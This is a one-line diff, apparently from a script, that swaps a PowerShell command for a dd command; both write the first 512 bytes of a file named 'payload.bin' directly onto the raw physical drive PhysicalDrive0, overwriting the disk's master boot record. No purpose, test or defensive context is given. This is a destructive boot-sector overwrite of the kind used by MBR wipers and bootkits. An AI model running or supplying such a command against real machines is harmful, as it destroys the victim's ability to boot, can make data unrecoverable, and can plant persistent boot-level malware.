@@ -1,1 +1,1 @@
-powershell "$s=[io.file]::OpenWrite('\\.\PhysicalDrive0');$s.Write([io.file]::ReadAllBytes('payload.bin'),0,512);$s.Close()"
+dd if=payload.bin of=\\.\PhysicalDrive0 bs=512 count=1
